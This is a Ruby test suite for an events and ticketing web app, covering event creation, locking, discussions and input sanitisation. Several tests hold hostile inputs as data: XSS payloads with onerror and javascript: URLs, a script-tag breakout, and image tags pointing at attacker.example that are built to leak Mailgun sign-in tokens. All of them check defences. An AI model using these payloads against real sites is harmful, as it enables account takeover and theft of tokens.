require File.expand_path("#{File.dirname(__FILE__)}/test_config.rb")

class EventsTest < ActiveSupport::TestCase
  include Capybara::DSL
  include Rack::Test::Methods

  def fill_event_create_form(event, ticket_type)
    fill_in 'Event title*', with: event.name
    execute_script %{$('#event_start_time').val('#{event.start_time.to_fs(:db_local)}')}
    execute_script %{$('#event_end_time').val('#{event.end_time.to_fs(:db_local)}')}
    fill_in 'Location', with: event.location if event.location
    click_link 'Tickets'
    execute_script %{$("a:contains('Add ticket type')").click()}
    fill_in 'event_ticket_types_attributes_0_name', with: ticket_type.name
    fill_in 'event_ticket_types_attributes_0_price_or_range', with: ticket_type.price_or_range
    fill_in 'event_ticket_types_attributes_0_quantity', with: ticket_type.quantity
    click_link 'Everything else'
  end

  # An event of a stripe-connected organisation with a coordinator, facilitator, tag, a checked-in ticket, donation,
  # charge, rpayment and feedback, for the stats table and CSV
  def create_stats_event(as)
    create_organisation unless @organisation
    @organisation.set(stripe_client_id: 'ca_test')
    attendee = Account.find_by(name: 'Ada Lovelace') || FactoryBot.create(:account, name: 'Ada Lovelace')
    coordinator = Account.find_by(name: 'Coco Ordinator') || FactoryBot.create(:account, name: 'Coco Ordinator')
    facilitator = Account.find_by(name: 'Fay Cilitator') || FactoryBot.create(:account, name: 'Fay Cilitator')
    tag = EventTag.find_by(name: 'wellbeing') || FactoryBot.create(:event_tag, name: 'wellbeing')
    event = create_event(prices: [10], as: as, coordinator: coordinator, facebook_event_url: 'https://www.facebook.com/events/1')
    event.event_facilitations.create!(account: facilitator)
    event.event_tagships.create!(event_tag: tag)
    order = event.orders.create!(account: attendee, currency: 'GBP', value: 10, payment_completed: true, payment_intent: "pi_#{as}")
    event.tickets.create!(account: attendee, order: order, ticket_type: event.ticket_types.first, payment_completed: true, checked_in: true)
    event.donations.create!(account: attendee, order: order, amount: 5, payment_completed: true)
    @organisation.stripe_charges.create!(event: event, order: order, amount: 1500, currency: 'GBP', balance_float: 15, fees_float: 0.5, de_donation_revenue: 5)
    event.rpayments.create!(account: @account, amount: 1, currency: 'GBP', role: 'organiser')
    event.event_feedbacks.create!(account: attendee, rating: 4)
    event
  end

  # The response body of the request the block makes, and how many Mongo commands it ran
  def mongo_commands_during
    commands = []
    subscriber = Object.new
    subscriber.define_singleton_method(:started) { |e| commands << e.command_name }
    subscriber.define_singleton_method(:succeeded) { |_| nil }
    subscriber.define_singleton_method(:failed) { |_| nil }
    Mongoid.default_client.subscribe(Mongo::Monitoring::COMMAND, subscriber)
    yield
    [last_response.body, commands.size]
  ensure
    Mongoid.default_client.unsubscribe(Mongo::Monitoring::COMMAND, subscriber)
  end

  def tag_event(event, tag)
    event.event_tagships.create!(event_tag: tag)
    event.reload
  end

  def tag_carousel(carousel, tag)
    carousel.carouselships.create!(event_tag: tag)
    carousel.sync_tagged_event_carousel_ids_without_delay(tag.id)
    carousel
  end

  def listing_event_ids
    JSON.parse(last_response.body).map { |event| event['id'] }
  end

  # Stands in for Mailgun::BatchMessage, keeping what an email would say
  class RecordedEmail
    attr_reader :recipients, :subject_line, :html

    def initialize
      @recipients = []
    end

    def add_recipient(_type, email, _variables)
      @recipients << email
    end

    def subject(text)
      @subject_line = text
    end

    def body_html(html)
      @html = html
    end

    def from(*); end
    def reply_to(*); end
    def finalize; end
  end

  # The emails the block would send, one per Mailgun::BatchMessage it makes
  def recorded_emails(&)
    emails = []
    Mailgun::BatchMessage.stub(:new, ->(*) { RecordedEmail.new.tap { |email| emails << email } }, &)
    emails
  end

  def xhr_get(path, params = {})
    get path, params, { 'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest' }
  end

  test 'upcoming events on the home page show whether each is starred, with the page' do
    create_event(as: :starred_event)
    create_event(as: :unstarred_event)
    @unstarred_event.tickets.create!(account: @account, ticket_type: FactoryBot.create(:ticket_type, event: @unstarred_event), payment_completed: true)
    @starred_event.event_stars.create!(account: @account)

    sign_in_with_rack(@account)
    get '/'
    assert_includes last_response.body, %(href="/e/#{@starred_event.slug}/unstar")
    assert_includes last_response.body, %(href="/e/#{@unstarred_event.slug}/do_star")
  end

  test 'creating an event' do
    create_organisation
    event = FactoryBot.build_stubbed(:event)
    ticket_type = FactoryBot.build_stubbed(:ticket_type)
    sign_in(@account)
    visit "/o/#{@organisation.slug}"
    click_link 'Create an event'
    fill_event_create_form(event, ticket_type)
    click_button 'Create event'
    assert page.has_content? 'Add to calendar'
  end

  test 'adding a facilitator updates the facilitators box in place, without reloading the page' do
    create_event
    facilitator = FactoryBot.create(:account, name: 'Maya Okoro', has_signed_in: true)
    sign_in(@account)
    visit "/e/#{@event.slug}"
    page.execute_script('window.notReloaded = true')

    box = "[data-pagelet-url='/e/#{@event.slug}/event_facilitations']"
    within(box) do
      find('.add-role-toggle').click
      find('.select2-selection').click
    end
    # select2 puts its search and results at the end of the page, outside the box
    find('.select2-search__field').send_keys('Maya')
    find('.select2-results__option', text: facilitator.name).click
    within(box) { click_button 'Add event facilitator' }

    assert page.has_css? "#{box} img[alt='#{facilitator.name}']"
    assert @event.event_facilitations.find_by(account: facilitator)
    assert page.evaluate_script('window.notReloaded')
  end

  test 'creating an event with a range' do
    covers 'events/price-range-slider@693b77'
    create_organisation
    event = FactoryBot.build_stubbed(:event)
    ticket_type = FactoryBot.build_stubbed(:ticket_type, price_or_range: '10-100')
    sign_in(@account)
    visit "/o/#{@organisation.slug}"
    click_link 'Create an event'
    fill_event_create_form(event, ticket_type)
    click_button 'Create event'
    assert page.has_content? 'Drag the slider'
  end

  test 'editing an event' do
    create_event(prices: [0])
    sign_in(@account)
    visit "/e/#{@event.slug}/edit"
    fill_in 'Event title*', with: (name = FactoryBot.build_stubbed(:event).name)
    click_button 'Update event'
    assert page.has_content? 'The event was saved'
    assert page.has_content? name
  end

  test 'public event submission creates draft and notifies admins' do
    covers 'organisations/who-becomes-event-admin@459b2f', 'organisations/community-event-submissions@e06059'
    Delayed::Job.delete_all if defined?(Delayed::Job)
    create_organisation(allow_event_submissions: true)
    submitter = FactoryBot.create(:account)
    event = FactoryBot.build_stubbed(:event)

    sign_in(submitter)
    visit "/o/#{@organisation.slug}/events"
    assert page.has_link?('Submit an event for review'), 'Non-admin should see submit button when org allows public submissions'

    click_link 'Submit an event for review'
    fill_in 'Event title*', with: event.name
    execute_script %{$('#event_start_time').val('#{event.start_time.to_fs(:db_local)}')}
    execute_script %{$('#event_end_time').val('#{event.end_time.to_fs(:db_local)}')}
    click_link 'Everything else'
    click_button 'Create event'

    created_event = Event.find_by(name: event.name)
    assert created_event, 'Event should be created'
    assert created_event.locked?, 'Event should be locked when submitted by non-admin'
    assert_equal submitter.id, created_event.account_id, 'Event should be attributed to submitter'
    assert_equal 0, created_event.notifications.and(type: 'created_event').count, 'Locked submission should not create a public event notification'
    assert_equal 1, Delayed::Job.and(handler: /send_public_submission_notification/).count, 'Submission email should be queued'

    visit "/e/#{created_event.slug}/edit"
    assert page.has_content?('Event title'), 'Submitter should be able to access edit page'
    assert page.has_no_css?('label[for="event_locked"]'), 'Submitter should not see locked checkbox'
    assert page.has_content?('submitted for review'), 'Submitter should see unlock message'
  end

  test 'event admin can lock but only lock admin can unlock' do
    covers 'organisations/who-becomes-event-admin@459b2f', 'organisations/community-event-submissions@e06059', 'organisations/table-unlock-locked@ec36f3'
    create_organisation(allow_event_submissions: true)
    org_admin = @account
    coordinator = FactoryBot.create(:account)
    create_event(coordinator: coordinator, locked: false, prices: [0])

    assert Event.admin?(@event, coordinator), 'Coordinator should be event admin'
    refute Event.lock_admin?(@event, coordinator), 'Coordinator should not be lock admin'

    # Event admin (coordinator) can lock an unlocked event
    sign_in(coordinator)
    visit "/e/#{@event.slug}/edit"
    assert page.has_css?('label[for="event_locked"]'), 'Event admin should see locked checkbox when event is unlocked'
    find('label[for="event_locked"]').click
    click_button 'Update event'
    assert page.has_content?('The event was saved')
    assert @event.reload.locked?, 'Event should be locked after event admin checks the box'

    # Event admin (coordinator) cannot unlock - checkbox should be hidden
    visit "/e/#{@event.slug}/edit"
    assert page.has_no_css?('label[for="event_locked"]'), 'Event admin should not see locked checkbox when event is locked (cannot unlock)'
    assert page.has_content?('submitted for review'), 'Non-lock-admin should see unlock message'

    # Lock admin (org admin) can unlock
    sign_in(org_admin)
    visit "/e/#{@event.slug}/edit"
    assert page.has_css?('label[for="event_locked"]'), 'Lock admin should see locked checkbox'
    find('label[for="event_locked"]').click
    click_button 'Update event'
    assert page.has_content?('The event was saved')
    refute @event.reload.locked?, 'Event should be unlocked after lock admin unchecks the box'
  end

  test 'event locked after a purchase error shows the error until unlocked' do
    create_event(prices: [0])
    @event.set(locked: true, locked_error: 'Creditor account not fully verified', locked_error_provider: 'GoCardless')

    sign_in(@account)
    visit "/e/#{@event.slug}/edit"
    assert page.has_content?('We received an error from GoCardless when someone tried to buy tickets')
    assert page.has_content?('Creditor account not fully verified')
    find('label[for="event_locked"]').click
    click_button 'Update event'
    assert page.has_content?('The event was saved')
    @event.reload
    refute @event.locked?
    assert_nil @event.locked_error
    assert_nil @event.locked_error_provider
  end

  test 'a duplicated event says it is a copy until it is first saved' do
    covers 'events/duplicate-starts-locked@9b7b43'
    create_event(prices: [0])
    sign_in(@account)
    duplicate = @event.duplicate!(@account)
    assert_equal @event, duplicate.duplicated_from

    visit "/e/#{duplicate.slug}/edit"
    assert page.has_content?("This is a duplicate of #{@event.name}")
    assert page.has_link?(@event.name, href: "/e/#{@event.slug}/edit")
    visit "/e/#{@event.slug}/edit"
    assert page.has_content?('Event title')
    assert page.has_no_content?('duplicate of')

    duplicate.name = nil
    refute duplicate.save
    assert_equal @event, duplicate.duplicated_from, 'A save that fails validation keeps the banner'
    duplicate.reload.save!
    assert_nil duplicate.reload.duplicated_from_id
    visit "/e/#{duplicate.slug}/edit"
    assert page.has_content?('Event title')
    assert page.has_no_content?('duplicate of')
  end

  test 'new events, duplicates included, give nothing to category stewards or social media' do
    create_event(prices: [0])
    @event.set(profit_share_to_category_steward: 10, profit_share_to_social_media: 5)
    @event.reload
    @event.save!
    assert_equal [10, 5], [@event.reload.profit_share_to_category_steward, @event.profit_share_to_social_media], 'Events from before keep their shares'

    duplicate = @event.duplicate!(@account)
    assert_equal 0, duplicate.profit_share_to_category_steward
    assert_equal 0, duplicate.profit_share_to_social_media

    event = Event.create!(@event.attributes.slice('name', 'location', 'currency').merge(start_time: 1.week.from_now, end_time: 1.week.from_now + 1.hour, account: @account, organisation: @organisation, profit_share_to_category_steward: 10, profit_share_to_social_media: 5))
    assert_equal [0, 0], [event.reload.profit_share_to_category_steward, event.profit_share_to_social_media]
  end

  test 'ticket email strips event-handler attributes from editor HTML' do
    create_event(
      prices: [0],
      extra_info_for_ticket_email: '<img src=x onerror=alert(1)><p>Zoom link</p>',
      ticket_email_greeting: '<p>Hello</p><img src=x onerror=alert(1)>'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(/onerror/i, html)
    refute_includes html, 'alert(1)'
    assert_includes html, 'Zoom link'
    assert_includes html, 'Hello'
  end

  test 'ticket email strips sign-in tokens from custom html images' do
    create_organisation(show_details_table_in_ticket_emails: true, show_sign_in_link_in_ticket_emails: true)
    create_event(
      name: 'Workshop %recipient.token%',
      prices: [0],
      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.tok%recipient.token%en%">'
    )
    order = @event.orders.new(account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)

    refute_match(%r{src="[^"]*%recipient\.token%}, html)
    refute_includes html, 'Workshop %recipient.token%'
    assert_includes html, 'Workshop'
    assert_includes html, 'link_token=%recipient.token%'
  end

  test 'names cannot keep a mailgun recipient token' do
    refute_includes EmailHelper.untrusted('%recipient.tok%recipient.token%en%', strip: true), '%recipient.token%'
    assert_equal '', EmailHelper.untrusted('%recipient.%recipient.x%token%', strip: true)
    assert_equal 'Ada %recipient.firstname', EmailHelper.untrusted('Ada %recipient.firstname%recipient.token%', strip: true)

    create_event(name: 'Workshop %recipient.token%', prices: [0])
    @account.update!(name: 'Ada %recipient.token%')
    @organisation.update!(name: 'Org %recipient.token%')

    assert_equal 'Workshop', @event.name
    assert_equal 'Ada', @account.name
    assert_equal 'Org', @organisation.name

    @event.update!(name: 'Workshop %recipient.tok%recipient.token%en%')
    @account.update!(name: 'Ada %recipient.tok%recipient.token%en%')
    @organisation.update!(name: 'Org %recipient.tok%recipient.token%en%')

    [@event, @account, @organisation].each { |record| refute_includes record.name, '%recipient.token%' }

    @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
    refute_includes @event.name, '%recipient'
  end

  test 'recipient variable values cannot open a mailgun recipient token' do
    create_event(prices: [0])
    # Survives name sanitising: if Mailgun fills in lastname (blank) after description_elements, it leaves %recipient.token%
    @event.ticket_types.first.update!(name: 'VIP %recipient.%recipient.lastname%token%')
    order = @event.orders.create!(account: @account, currency: @event.currency, value: 0, payment_completed: true)
    order.tickets.create!(event: @event, account: @account, ticket_type: @event.ticket_types.first, price: 0)

    description_elements = EmailFields.recipient_tag_values(event: @event, account: @account, orders: [order])['description_elements']

    assert_includes description_elements, 'VIP'
    refute_includes description_elements.gsub('%recipient.lastname%', ''), '%recipient.token%'
  end

  test 'mailgun recipient variable values cannot open a recipient token' do
    # Mailgun rescans subjects, so text and values that join into %recipient.token% get filled in (tested Oct 2026);
    # replace_recipient_variables fills in key by key, which does the same
    texts = ['%recipient.firstname%%', '%recipient.firstname%%recipient.lastname%', '%%recipient.lastname%%', '%recipient.username%recipient%recipient.fullname%%']
    ['%recipient.token', '% recipient.token%', 'Ada recipient.token', 'Ada .token%'].each do |name|
      account = FactoryBot.create(:account, name: name)
      batch_message = Mailgun::BatchMessage.new(Mailgun::Client.new('key'), 'example.com')
      batch_message.add_recipient(:to, account.email, { 'firstname' => account.firstname, 'lastname' => account.lastname, 'fullname' => account.name, 'username' => nil, 'token' => 'SECRET' })
      variables = batch_message.recipient_variables[account.email]

      texts.each do |text|
        refute_includes EmailFields.replace_recipient_variables(EmailHelper.untrusted(text), variables), 'SECRET', "#{name.inspect} with #{text.inspect}"
        batch_message.subject(text)
        refute_includes EmailFields.replace_recipient_variables(Array(batch_message.message[:subject]).last, variables), 'SECRET', "subject #{name.inspect} with #{text.inspect}"
      end
      assert_equal 'SECRET', variables['token']
      assert_nil variables['username']
    end
  end

  test 'names never keep angle brackets however they were encoded' do
    # Double-encoded so a single decode pass would otherwise leave live markup in the name
    create_event(name: 'Workshop &lt;img src="https://attacker.example/x?t=&amp;#37;recipient.token&amp;#37;"&gt;', prices: [0])
    @account.update!(name: 'Ada &lt;b&gt;Lovelace&lt;/b&gt;')

    refute_match(/[<>]/, @event.name)
    refute_match(/[<>]/, @account.name)
    assert_equal 'Ada', @account.firstname
  end

  test 'rich text keeps only the allowed style properties' do
    html = '<p style="position:fixed;z-index:9;background:url(https://attacker.example/x.png);color:red;text-align:center">x</p>' \
           '<span style="width:10px;inset:0;background-color:blue">y</span>'
    [Sanitize::Config::DANDELION, Sanitize::Config::IFRAMES].each do |config|
      assert_equal '<p style="color:red;text-align:center">x</p><span style="width:10px;background-color:blue">y</span>',
                   Sanitize.fragment(html, config)
    end
  end

  test 'rich text keeps only the classes CKEditor and our own markup use' do
    html = '<div class="position-fixed top-0 start-0 w-100 vh-100 bg-white z-3">x</div>' \
           '<div class="offcanvas offcanvas-start show"><div class="offcanvas-body">y</div></div>' \
           '<a class="btn btn-primary stretched-link" href="https://example.com">z</a>' \
           '<figure class="image image-style-align-left"><img src="https://example.com/a.png"></figure>' \
           '<p class="lead">l</p><pre><code class="language-ruby">c</code></pre>'
    [Sanitize::Config::DANDELION, Sanitize::Config::IFRAMES].each do |config|
      assert_equal '<div>x</div><div><div>y</div></div>' \
                   '<a class="btn btn-primary" href="https://example.com">z</a>' \
                   '<figure class="image image-style-align-left"><img src="https://example.com/a.png"></figure>' \
                   '<p class="lead">l</p><pre><code class="language-ruby">c</code></pre>',
                   Sanitize.fragment(html, config)
    end
  end

  test 'rsvp button text is escaped on the event page' do
    create_event(prices: [0], rsvp_button_text: '<img src=x onerror=alert(1)>')

    get "/e/#{@event.slug}"
    assert last_response.ok?
    refute_match(%r{<img[^>]*onerror}, last_response.body)
    assert_includes last_response.body, '&lt;img src=x onerror=alert(1)&gt;'
  end

  test 'event page views are counted until the event starts' do
    create_event(prices: [0])

    2.times { get "/e/#{@event.slug}" }
    get "/e/#{@event.slug}.json"
    assert_equal 2, @event.reload.page_views_count

    @event.set(start_time: 1.hour.ago)
    get "/e/#{@event.slug}"
    assert last_response.ok?
    assert_equal 2, @event.reload.page_views_count
  end

  # An attendee of the event, on its page with the discussion open
  def visit_discussion_as_attendee
    attendee = FactoryBot.create(:account)
    @event.tickets.create!(account: attendee, ticket_type: @event.ticket_types.first, payment_completed: true)
    sign_in(attendee)
    visit "/e/#{@event.slug}"
    click_button 'Discussion'
    assert page.has_link?('Email notifications off')
    attendee
  end

  test 'email notifications for a discussion nobody has written in yet make its post' do
    create_event(prices: [0])
    attendee = visit_discussion_as_attendee
    assert_nil @event.discussion_post

    click_link 'Email notifications off'
    assert page.has_link?('Email notifications on')
    assert @event.discussion_post.subscriptions.and(account: attendee).exists?

    click_link 'Email notifications on'
    assert page.has_link?('Email notifications off')
    assert_not @event.discussion_post.subscriptions.and(account: attendee).exists?
  end

  test 'the unsubscribe link in older discussion emails unsubscribes' do
    create_event(prices: [0])
    attendee = FactoryBot.create(:account)
    @event.tickets.create!(account: attendee, ticket_type: @event.ticket_types.first, payment_completed: true)
    @event.discussion_post!(attendee).subscriptions.create!(account: attendee)

    get "/e/#{@event.slug}", link_token: attendee.link_token
    get "/e/#{@event.slug}/unsubscribe_discussion"
    assert last_response.redirect?
    assert_not @event.discussion_post.subscriptions.and(account: attendee).exists?
  end

  test 'people who are not attendees are not shown the discussion' do
    create_event(prices: [0])
    sign_in(FactoryBot.create(:account))
    visit "/e/#{@event.slug}"
    assert page.has_content?(@event.name)
    assert page.has_no_button?('Discussion')
    assert page.has_no_link?('Email notifications off')
  end

  test 'only people who can see the discussion can subscribe to it' do
    create_event(prices: [0])
    outsider = FactoryBot.create(:account)

    get "/e/#{@event.slug}", link_token: outsider.link_token
    post "/e/#{@event.slug}/subscribe_discussion"
    assert_not last_response.ok?
    assert_nil @event.discussion_post
  end

  test 'a discussion comment needs a body' do
    create_event(prices: [0])
    visit_discussion_as_attendee

    fill_in 'comment_body', with: ' '
    click_button 'Post'
    # The discussion reloads once the comment is sent, with the box empty again
    assert page.has_field?('comment_body', with: '')
    assert_not @event.comments.exists?
    assert_nil @event.discussion_post

    fill_in 'comment_body', with: 'Hello'
    click_button 'Post'
    assert page.has_css?('#chat .comment-body', text: 'Hello')
    assert_equal ['Hello'], @event.comments.pluck(:body)
  end

  test 'a discussion comment cannot be edited to nothing' do
    create_event(prices: [0])
    attendee = FactoryBot.create(:account)
    @event.tickets.create!(account: attendee, ticket_type: @event.ticket_types.first, payment_completed: true)
    comment = @event.discussion_post!(attendee).comments.create!(account: attendee, commentable: @event, body: 'Hello')

    get "/e/#{@event.slug}", link_token: attendee.link_token
    post "/comments/#{comment.id}/edit", body: ''
    assert_equal 400, last_response.status
    assert_equal 'Hello', comment.reload.body
  end

  test 'comment mentions link to profiles and subscribe the people mentioned' do
    create_event(prices: [0])
    mentioned = FactoryBot.create(:account, name: 'Ada Lovelace', username: 'ada.lovelace')
    discussion = @event.discussion_post!(@account)
    comment = discussion.comments.create!(account: @account, commentable: @event,
                                          body: "Thanks @Ada.Lovelace. Write to me@example.com, or ask @nobody_here <b>now</b>. See https://example.com/a?b=1&c=2.")

    assert discussion.subscriptions.and(account: mentioned).exists?
    assert_equal 2, discussion.subscriptions.count
    html = comment.body_html
    assert_includes html, '<a href="/u/ada.lovelace">Ada Lovelace</a>. Write'
    assert_includes html, '<a href="mailto:me@example.com" target="_blank">me@example.com</a>'
    assert_includes html, '@nobody_here &lt;b&gt;now&lt;/b&gt;'
    assert_includes html, '<a href="https://example.com/a?b=1&amp;c=2" target="_blank">https://example.com/a?b=1&amp;c=2</a>.'
    assert_includes comment.body_with_additions, %(<a href="#{ENV['BASE_URI']}/u/ada.lovelace">)

    get "/e/#{@event.slug}", link_token: @account.link_token
    assert_includes last_response.body, '<a href="/u/ada.lovelace">Ada Lovelace</a>'
  end

  test 'a comment mention ending in a dot subscribes only the account it links to' do
    create_event(prices: [0])
    jo = FactoryBot.create(:account, username: 'jo')
    jo_dot = FactoryBot.create(:account, username: 'jo.')
    discussion = @event.discussion_post!(@account)
    comment = discussion.comments.create!(account: @account, commentable: @event, body: 'Over to @jo. today')

    assert discussion.subscriptions.and(account: jo_dot).exists?
    assert_not discussion.subscriptions.and(account: jo).exists?
    assert_includes comment.body_html, '<a href="/u/jo.">'
  end

  test 'json-ld cannot close the script tag' do
    create_event(prices: [0], description: '<p>Welcome</p>')
    # location/website are not name-sanitised; description text is HTML-decoded
    @event.set(location: '</script><img src="https://attacker.example/x">')
    @event.set(description: '<p>&lt;/script&gt;<img src="https://attacker.example/x"></p>')
    @organisation.set(website: 'https://example.com/</script><img src="https://attacker.example/x">')
    @event.reload
    @organisation.reload

    get "/e/#{@event.slug}"
    assert last_response.ok?

    json_ld = last_response.body[%r{<script type="application/ld\+json">\s*(.*?)\s*</script>}m, 1]
    assert json_ld, 'expected JSON-LD block'
    refute_includes json_ld, '</script>'
    assert_includes json_ld, '\u003c/script\u003e'

    parsed = JSON.parse(json_ld)
    assert_equal @event.location, parsed.dig('location', 'name')
    assert_equal @event.organisation.website, parsed.dig('organizer', 'url')
    assert_equal '</script>', parsed['description']
  end

  test 'names are escaped in emails' do
    create_event(prices: [0])
    # Bypass sanitisation: output escaping must hold even for a stored name containing live markup
    @event.set(name: 'Workshop <img src="https://attacker.example/x?t=&#37;recipient.token&#37;">')

    html = EmailHelper.html(:waitlist_tickets_available, event: @event)

    refute_match(/<img[^>]*attacker\.example/, html)
    assert_includes html, 'Workshop &lt;img'
    assert_equal html.scan('link_token=%recipient.token%').size, html.scan('%recipient.token%').size
  end

  test 'youtube titles are escaped in emails' do
    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
    EmailHelper.stub(:youtube_title, '<img src="https://attacker.example/x?t=%recipient.token%"> & more') do
      html = EmailHelper.rich_text(@event.extra_info_for_ticket_email)

      refute_match(/<img[^>]*attacker\.example/, html)
      refute_includes html, '%recipient.token%'
      assert_includes html, '&lt;img'
      assert_includes html, '&amp; more'
    end
  end

  test 'private youtube videos are linked without a title in emails' do
    create_event(prices: [0], extra_info_for_ticket_email: '<oembed url="https://www.youtube.com/watch?v=abc123"></oembed>')
    EmailHelper.stub(:youtube_title, nil) do
      assert_includes EmailHelper.rich_text(@event.extra_info_for_ticket_email),
                      '<a href="https://www.youtube.com/watch?v=abc123">link to private YouTube video</a>'
    end
  end

  test 'intentional html still renders in emails' do
    create_organisation(show_details_table_in_ticket_emails: true)
    create_event(name: 'Tom & Jerry', prices: [0], extra_info_for_ticket_email: '<p>See <strong>you</strong> there</p>')
    order = @event.orders.new(account: @account)
    tickets_table = EmailHelper.render(:_tickets_table, event: @event, account: @account)
    html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: tickets_table, header_image_url: nil)

    assert_includes html, 'Tom &amp; Jerry'
    assert_includes html, '<strong>you</strong>'
    assert_includes html, '<table class="event-details"'
  end

  test 'nested ticket type cannot reference another event ticket group' do
    create_event(prices: [0])
    own_group = @event.ticket_groups.create!(name: 'Own', capacity: 10)
    other_organisation = FactoryBot.create(:organisation, account: FactoryBot.create(:account))
    other_event = FactoryBot.create(:event, organisation: other_organisation, prices: [0])
    other_group = other_event.ticket_groups.create!(name: 'Backstage', capacity: 10)
    ticket_type = @event.ticket_types.first

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, ticket_group_id: other_group.id.to_s } }
    }

    refute last_response.redirect?
    assert_nil ticket_type.reload.ticket_group_id
    assert_empty other_group.tickets

    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, ticket_group_id: own_group.id.to_s } }
    }

    assert last_response.redirect?, last_response.body
    assert_equal own_group.id, ticket_type.reload.ticket_group_id
  end

  test 'nested ticket types and groups cannot be moved to another event' do
    create_event(prices: [0])
    own_group = @event.ticket_groups.create!(name: 'Own', capacity: 10)
    other_organisation = FactoryBot.create(:organisation, account: FactoryBot.create(:account))
    other_event = FactoryBot.create(:event, organisation: other_organisation, prices: [0])
    ticket_type = @event.ticket_types.first

    sign_in_with_rack(@account)
    post "/e/#{@event.slug}/edit", event: {
      ticket_types_attributes: { '0' => { id: ticket_type.id.to_s, name: ticket_type.name, quantity: ticket_type.quantity.to_s, event_id: other_event.id.to_s } },
      ticket_groups_attributes: { '0' => { id: own_group.id.to_s, name: own_group.name, capacity: own_group.capacity.to_s, event_id: other_event.id.to_s } }
    }

    # mass_assigning drops event_id, so the event saves with both left where they were
    assert last_response.redirect?
    assert_equal @event.id, ticket_type.reload.event_id
    assert_equal @event.id, own_group.reload.event_id
  end

  test 'redirect_url must be a valid http or https URL' do
    create_organisation
    event = FactoryBot.build(:event, organisation: @organisation)

    event.redirect_url = 'https://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'http://example.com/thanks'
    assert event.valid?

    event.redirect_url = 'javascript:alert(document.cookie)'
    refute event.valid?
    assert_includes event.errors[:redirect_url], 'must be a valid http or https URL'

    event.redirect_url = 'data:text/html,<script>alert(1)</script>'
    refute event.valid?

    event.redirect_url = nil
    assert event.valid?
  end

  test 'safe_redirect_url ignores stored javascript URLs' do
    create_event
    @event.set(redirect_url: 'javascript:alert(1)')

    assert_nil @event.reload.safe_redirect_url
    assert_equal 'https://example.org/thanks', @event.tap { |e| e.redirect_url = 'https://example.org/thanks' }.safe_redirect_url
  end

  test 'link fields reject javascript: and other non-http schemes' do
    create_event
    ['javascript:alert(1)', 'JavaScript:alert(1)', ' javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:msgbox(1)'].each do |url|
      @event.purchase_url = url
      @event.facebook_event_url = url
      refute @event.valid?, url
      assert @event.errors[:purchase_url].any?, url
      assert @event.errors[:facebook_event_url].any?, url

      @organisation.website = url
      @organisation.become_a_member_url = url
      refute @organisation.valid?, url
      assert @organisation.errors[:website].any?, url
      assert @organisation.errors[:become_a_member_url].any?, url

      @account.website = url
      refute @account.valid?, url
      assert @account.errors[:website].any?, url
    end
  end

  test 'link fields accept http and https and add https:// to a bare domain' do
    create_event
    @organisation.update!(website: 'http://example.com', become_a_member_url: 'https://example.com/join')
    assert_equal 'http://example.com', @organisation.website
    @account.update!(website: '  www.example.com/me ')
    assert_equal 'https://www.example.com/me', @account.website
    @event.update!(purchase_url: 'https://tickets.example.com/x', facebook_event_url: '')
    assert_equal 'https://tickets.example.com/x', @event.purchase_url
    assert_nil @event.facebook_event_url
  end

  test 'activity website rejects javascript:' do
    create_organisation
    activity = @organisation.activities.build(name: 'Activity', slug: 'activity', account: @account, website: 'javascript:alert(1)')
    refute activity.valid?
    assert activity.errors[:website].any?
  end

  test 'terms and conditions url rejects javascript:' do
    create_event
    @event.terms_and_conditions_url = 'javascript:alert(1)'
    refute @event.valid?
    assert @event.errors[:terms_and_conditions_url].any?
    @organisation.terms_and_conditions_url = 'javascript:alert(1)'
    refute @organisation.valid?
    assert @organisation.errors[:terms_and_conditions_url].any?
  end

  test 'location signal group link rejects javascript:' do
    location = Location.new(name: 'Somewhere', signal_group_link: 'javascript:alert(1)')
    refute location.valid?
    assert location.errors[:signal_group_link].any?
    location.signal_group_link = 'https://signal.group/#abc'
    assert location.valid?
  end

  test 'non-ASCII http urls are accepted' do
    assert HttpUrl.valid?('https://example.com/café')
    assert HttpUrl.valid?('https://bücher.de/')
    assert_not HttpUrl.valid?('javascript:alert("é")')
    assert_not HttpUrl.valid?('https://example.com/a b')
    assert_equal 'bücher.de', HttpUrl.host('https://www.bücher.de/x')

    create_organisation
    @organisation.website = 'example.com/café'
    assert @organisation.valid?, @organisation.errors.full_messages.to_sentence
    assert_equal 'https://example.com/café', @organisation.website

    @organisation.website = 'coming soon'
    assert_not @organisation.valid?
  end

  test 'slug uniqueness includes deleted events' do
    create_event
    slug = @event.slug
    @event.destroy

    assert_nil Event.find_by(slug: slug)
    assert Event.unscoped.and(slug: slug).exists?

    clash = FactoryBot.build(:event, organisation: @organisation, slug: slug)
    refute clash.valid?
    assert clash.errors[:slug].any?
  end

  test 'duplicating an event skips slugs belonging to deleted events' do
    create_event(as: :event1, prices: [0])
    create_event(as: :event2, slug: 'a0aaa')
    @event2.destroy

    candidates = ['a0aaa', 'z9zzz']
    Event.stub :slug_candidate, -> { candidates.shift } do
      duplicate = @event1.duplicate!(@account)
      assert duplicate.persisted?
      assert_equal 'z9zzz', duplicate.slug
    end
  end

  # ═══════════════════════════════════════════════════════════════════════════
  # Reminders and feedback
  # ═══════════════════════════════════════════════════════════════════════════

  test 'reminder is due when its send time falls within the next hour' do
    covers 'events/reminder-before-event@004602'
    now = Time.utc(2026, 3, 13, 8, 55, 0)
    event = Event.new(start_time: Time.utc(2026, 3, 13, 10, 0, 0), reminder_hours_before: 1)

    assert event.reminder_due_within?(1.hour, now)
  end

  test 'reminder is not due once the event has started' do
    covers 'events/reminder-before-event@004602'
